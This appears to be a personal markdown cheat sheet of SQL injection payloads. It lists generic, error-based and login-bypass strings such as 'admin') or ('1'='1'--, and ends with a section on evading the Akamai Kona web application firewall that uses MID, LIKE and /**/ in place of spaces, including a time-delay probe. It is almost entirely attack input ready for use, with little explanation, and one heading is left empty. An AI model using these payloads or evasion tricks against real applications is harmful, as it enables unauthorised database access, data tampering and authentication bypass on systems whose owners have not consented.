    # SQL Injection

SQLi is a security weakness which allows attackers to control and applications database and allowing them to,
for instance modify data or change the database applications behaviour by tricking the database into allowing 
sending SQL commands.
Some I like to give a crack are;
    
    # Generic SQL Injection Payloads

- ' or '
- OR "" = "
- '=0--+
- 'LIKE'
- - ' AND id IS NULL; --
- '''''''''''''UNION SELECT '2


        # Generic Error Based Payloads

- OR 1=1
- OR 1=1-- 
- OR 3409=3409 AND ('pytW' LIKE 'pytW
- %' AND 8310=8310 AND '%'='
- AND 1=1 AND '%'='


        # Authentication Based Payloads

- admin') or ('1'='1'--
- or true--
- admin') or ('1'='1'#
- ' or ''&'
- admin') or ('1'='1'/
 
 
        # Ordre and Union based palloads


        # Akamai Kona Bypass

MID instead of SUBSTRING
LIKE instead of =
/**/ instead of a space
CURRENT_USER instead of CURRENT_USER()
" instead of '

$_Example

_444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
       
_OR/**/3409LIKE3409/**/AND/**/("pytW"/**/LIKE/**/"pytW

_test' or us.username like '%' and sleep(42_='1


_AND 1=1 AND '%'='
=




